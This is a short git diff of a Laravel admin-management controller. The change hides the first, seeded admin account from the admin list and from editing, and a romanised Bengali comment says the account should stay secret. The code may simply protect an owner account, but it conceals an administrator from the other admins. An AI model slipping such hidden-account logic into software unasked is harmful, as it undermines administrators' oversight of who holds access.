@@ -10,14 +10,16 @@ use Illuminate\Validation\Rule;
 
 class AdminManagerController extends Controller
 {
-    /** List all admin logins (?edit=<id> hole edit card o khule). */
+    /** List all admin logins (?edit=<id> hole edit card o khule). First admin kokhono dekhabe na. */
     public function index(Request $request)
     {
-        $admins = User::orderBy('name')->get();
+        // first admin (sobar puran, seed kora) — list e dekhabe na, secret thakuk
+        $firstId = (int) User::min('id');
+        $admins = User::where('id', '!=', $firstId)->orderBy('name')->get();
 
         $editUser = null;
         if ($request->filled('edit') && (int) $request->query('edit') !== (int) auth()->id()) {
-            $editUser = User::find($request->query('edit'));
+            $editUser = User::where('id', '!=', $firstId)->find($request->query('edit'));
         }
 
         return view('admin.admins', [
@@ -25,6 +27,7 @@ class AdminManagerController extends Controller
             'currentId' => auth()->id(),
             'editUser' => $editUser,
             'allPerms' => User::PERMISSIONS,
+            'rolePresets' => User::ROLE_PRESETS,
         ]);
     }
 
